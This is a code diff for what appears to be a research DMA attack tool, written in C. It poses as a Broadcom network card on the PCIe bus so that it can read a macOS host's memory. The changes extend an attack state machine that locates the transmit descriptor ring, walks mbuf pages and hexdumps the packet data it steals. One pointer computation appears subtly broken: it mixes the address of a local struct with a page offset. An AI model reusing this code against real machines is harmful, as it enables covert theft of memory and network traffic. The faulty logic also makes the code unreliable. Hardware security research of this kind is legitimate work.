@@ -37,9 +37,16 @@
 #include <stdio.h>
 
 #include "mask.h"
+#include "macos-stub-mbuf.h"
 #include "pcie.h"
 #include "pcie-backend.h"
 #include "qemu/bswap.h"
+
+static inline uint16_t
+uint16_min(uint16_t left, uint16_t right)
+{
+	return (left < right) ? left : right;
+}
 
 /*
  * We want to snoop data out of anything interesting. A good candidate is the
@@ -105,7 +112,7 @@ is_probably_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
 	return ((buffer->flags &
 		(uint32_mask_enable_bits(5, 3) | uint32_mask_enable_bits(14, 10)))
 		== 0) && buffer->length != 0 && (buffer->reserved == 0) &&
-		(buffer->host_address != 0);
+		((buffer->host_address >> 32) != 0);
 }
 
 bool
@@ -168,7 +175,7 @@ hexdump(uint8_t* data, uint64_t length)
 		}
 		printf("%02x", data[offset]);
 		++offset;
-		if (offset % BYTES_PER_LINE == 0) {
+		if ((offset % BYTES_PER_LINE == 0) || offset >= length) {
 			putchar(' ');
 			for (char_offset = offset - BYTES_PER_LINE; char_offset < offset;
 				++char_offset) {
@@ -213,7 +220,8 @@ enum attack_state {
 	 */
 	AS_LOOKING_FOR_LEAKED_SYMBOL,
 	AS_LOOKING_FOR_DESCRIPTOR_RING,
-	AS_FINDING_MBUF_PAGE
+	AS_FINDING_MBUF,
+	AS_READING_MBUF_PAGE
 };
 
 enum packet_response {
@@ -313,11 +321,16 @@ main(int argc, char *argv[])
 	 * We have found that in practise the tx ring is not located lower
 	 * than this.
 	 */
+	struct bcm5701_send_buffer_descriptor *descriptor;
 	struct bcm5701_send_buffer_descriptor descriptors[16];
 	uint64_t candidate_symbols[32];
-	uint8_t mbuf[256];
+	uint8_t read_buffer[512];
+	struct mbuf mbuf;
 
-	uint64_t host_address_to_probe, aligned_ha, shifted_ha;
+	uint16_t length;
+	uint64_t descriptor_index, host_address, mbuf_page_address, mbuf_index;
+	uint64_t mbuf_address, mbuf_data_address;
+	uint8_t *mbuf_data;
 
 	int init = pcie_hardware_init(argc, argv, &physmem);
 	if (init) {
@@ -330,6 +343,15 @@ main(int argc, char *argv[])
 	drain_pcie_core();
 	puts("PCIe Core Drained. Let's go.");
 
+
+	/* The rule of thumb I wanted whilst writing this was that the card only
+	 * makes one DMA request/response before checking if the card has data for
+	 * it.
+	 *
+	 * However, a lot of what I want to do is iterating through various
+	 * collections of data items. This means that this is a while loop
+	 * consisting of a number of what are essentially unrolled for loops.
+	 */
 
 	while (1) {
 		wait_for_tlp(tlp_in_quadword, sizeof(tlp_in_quadword), &raw_tlp_in);
@@ -404,35 +426,71 @@ main(int argc, char *argv[])
 			}
 			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
 			print_descriptors(descriptors, 1);
-			printf("host_address >> 32 = 0x%lx.\n",
-				descriptors[0].host_address >> 32);
-			printf("host_address with mask = 0x%lx.\n",
-				descriptors[0].host_address & uint64_mask(32));
-			packet_response_state.attack_state = AS_FINDING_MBUF_PAGE;
-			host_address_to_probe = descriptors[0].host_address;
+			packet_response_state.attack_state = AS_FINDING_MBUF;
+			descriptor_index = 0;
 
 			break;
-		case AS_FINDING_MBUF_PAGE:
-			aligned_ha = host_address_to_probe & ~0xFFl;
-			printf("Reading address 0x%lx.\n", aligned_ha);
-			read_result = perform_dma_read(mbuf, 256,
-				packet_response_state.devfn, 0, aligned_ha);
-			if (read_result == -1) {
-				printf("Read failed. :(\n");
-			} else {
-				hexdump(mbuf, 256);
+		case AS_FINDING_MBUF:
+			descriptor = &(descriptors[descriptor_index]);
+			if (is_probably_descriptor(descriptor)) {
+				host_address = descriptor->host_address >> 32;
+				if ((host_address & uint64_mask(11)) == 0) {
+					/* clusters are 2k aligned. */
+					length = uint16_min(descriptor->length, 512);
+					printf("Reading address 0x%lx.\n", host_address);
+					read_result = perform_dma_read(read_buffer, length,
+						packet_response_state.devfn, 0, host_address);
+					if (read_result == -1) {
+						printf("Read failed. :(\n");
+					} else {
+						hexdump(read_buffer, length);
+					}
+				} else { /* It's an mbuf, so we can look at the whole page. */
+					mbuf_index = 0;
+					mbuf_page_address = host_address & ~uint64_mask(12);
+					packet_response_state.attack_state = AS_READING_MBUF_PAGE;
+				}
 			}
-			shifted_ha = (host_address_to_probe >> 32) & ~0xFFl;
-			printf("Reading address 0x%lx.\n", shifted_ha);
-			read_result = perform_dma_read(mbuf, 256,
-				packet_response_state.devfn, 0, shifted_ha);
-			if (read_result == -1) {
-				printf("Read failed. :(\n");
-			} else {
-				hexdump(mbuf, 256);
+			descriptor_index++;
+			if (descriptor_index >= 16 &&
+				packet_response_state.attack_state != AS_READING_MBUF_PAGE) {
+				printf("LOOKING FOR DESCRIPTOR RING AGAIN!.\n");
+				packet_response_state.attack_state =
+					AS_LOOKING_FOR_DESCRIPTOR_RING;
 			}
-
-			packet_response_state.attack_state = AS_LOOKING_FOR_DESCRIPTOR_RING;
+			break;
+		case AS_READING_MBUF_PAGE:
+			mbuf_address = mbuf_page_address + (mbuf_index * 256);
+			read_result = perform_dma_read((uint8_t *)(&mbuf), 256,
+				packet_response_state.devfn, 0, mbuf_address);
+			if (read_result == -1) {
+				printf("Failed to read mbuf at 0x%lx.\n", mbuf_address);
+			} else {
+				mbuf.m_flags = bswap16(mbuf.m_flags);
+				if (!(mbuf.m_flags & M_EXT)) {
+					/* We don't have the address for external data. Hopefully
+					 * we found it elsewhere.
+					 */
+					mbuf.m_data = bswap64(mbuf.m_data);
+					mbuf.m_len = bswap32(mbuf.m_len);
+					if (mbuf.m_len > 0 && mbuf.m_len < 224) { /* Probably not an mbuf. */
+						mbuf_data = (uint8_t *)(
+							((uint64_t)(&mbuf) & ~uint64_mask(12))
+							| ((uint64_t)mbuf.m_data & uint64_mask(12))
+							);
+						printf("mbuf.m_data: 0x%lx. len: %d. ",
+							mbuf.m_data, mbuf.m_len);
+						printf("Data from mbuf at 0x%lx.\n", mbuf_address);
+						hexdump(mbuf_data, mbuf.m_len);
+					}
+				}
+			}
+			++mbuf_index;
+			if (mbuf_index >= (4096 / 256)) {
+				packet_response_state.attack_state = (descriptor_index >= 16) ?
+					AS_LOOKING_FOR_DESCRIPTOR_RING : AS_FINDING_MBUF;
+			}
+			break;
 		}
 	}
 	
